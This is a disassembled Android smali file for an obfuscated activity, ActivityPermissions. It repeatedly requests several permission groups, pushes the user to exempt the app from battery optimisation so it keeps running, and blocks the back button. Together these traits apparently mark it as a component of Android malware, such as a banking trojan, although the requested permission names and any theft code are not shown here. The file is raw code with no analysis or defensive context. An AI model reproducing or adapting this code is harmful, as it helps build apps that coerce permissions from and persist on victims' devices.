.class public Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;
.super Landroid/app/Activity;
.source ""


# instance fields
.field fddo:Lnaqsl/ebxcb/exu/for;

.field ifdf:Lnaqsl/ebxcb/exu/int;


# direct methods
.method public constructor <init>()V
    .registers 2

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    new-instance v0, Lnaqsl/ebxcb/exu/for;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/for;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    new-instance v0, Lnaqsl/ebxcb/exu/int;

    invoke-direct {v0}, Lnaqsl/ebxcb/exu/int;-><init>()V

    iput-object v0, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->ifdf:Lnaqsl/ebxcb/exu/int;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .registers 5

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->ifdf:Lnaqsl/ebxcb/exu/int;

    invoke-virtual {p1, p0}, Lnaqsl/ebxcb/exu/int;->this(Landroid/content/Context;)Z

    move-result p1

    if-eqz p1, :cond_e

    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    :cond_e
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v0, 0x17

    if-lt p1, v0, :cond_89

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->int:[Ljava/lang/String;

    const/4 v1, 0x0

    aget-object p1, p1, v1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    const/16 v2, 0x6f

    if-eqz p1, :cond_2a

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->int:[Ljava/lang/String;

    invoke-virtual {p0, p1, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :cond_2a
    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->new:[Ljava/lang/String;

    aget-object p1, p1, v1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_3d

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->new:[Ljava/lang/String;

    invoke-virtual {p0, p1, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :cond_3d
    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->try:[Ljava/lang/String;

    aget-object p1, p1, v1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_50

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->try:[Ljava/lang/String;

    invoke-virtual {p0, p1, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :cond_50
    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->byte:[Ljava/lang/String;

    aget-object p1, p1, v1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_63

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->byte:[Ljava/lang/String;

    invoke-virtual {p0, p1, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :cond_63
    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->for:[Ljava/lang/String;

    aget-object p1, p1, v1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_76

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->for:[Ljava/lang/String;

    invoke-virtual {p0, p1, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :cond_76
    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->ifdf:[Ljava/lang/String;

    aget-object p1, p1, v1

    invoke-virtual {p0, p1}, Landroid/app/Activity;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result p1

    if-eqz p1, :cond_89

    iget-object p1, p0, Lnaqsl/ebxcb/exu/Activity/ActivityPermissions;->fddo:Lnaqsl/ebxcb/exu/for;

    iget-object p1, p1, Lnaqsl/ebxcb/exu/for;->ifdf:[Ljava/lang/String;

    invoke-virtual {p0, p1, v2}, Landroid/app/Activity;->requestPermissions([Ljava/lang/String;I)V

    :cond_89
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt p1, v0, :cond_cc

    const-string p1, "power"

    invoke-virtual {p0, p1}, Landroid/app/Activity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/os/PowerManager;

    invoke-virtual {p0}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_cc

    :try_start_9f
    new-instance p1, Landroid/content/Intent;

    const-string v0, "android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "package:"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p0}, Landroid/app/Activity;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-direct {p1, v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;Landroid/net/Uri;)V

    const/high16 v0, 0x10000000

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v0, 0x40000000    # 2.0f

    invoke-virtual {p1, v0}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {p0, p1}, Landroid/app/Activity;->startActivity(Landroid/content/Intent;)V
    :try_end_cc
    .catch Ljava/lang/Exception; {:try_start_9f .. :try_end_cc} :catch_cc

    :catch_cc
    :cond_cc
    invoke-virtual {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method protected onDestroy()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .registers 4

    const/4 v0, 0x4

    if-eq p1, v0, :cond_c

    invoke-super {p0, p1, p2}, Landroid/app/Activity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result p1

    if-eqz p1, :cond_a

    goto :goto_c

    :cond_a
    const/4 p1, 0x0

    goto :goto_d

    :cond_c
    :goto_c
    const/4 p1, 0x1

    :goto_d
    return p1
.end method

.method protected onPause()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    return-void
.end method

.method protected onResume()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onResume()V

    return-void
.end method

.method protected onStop()V
    .registers 1

    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
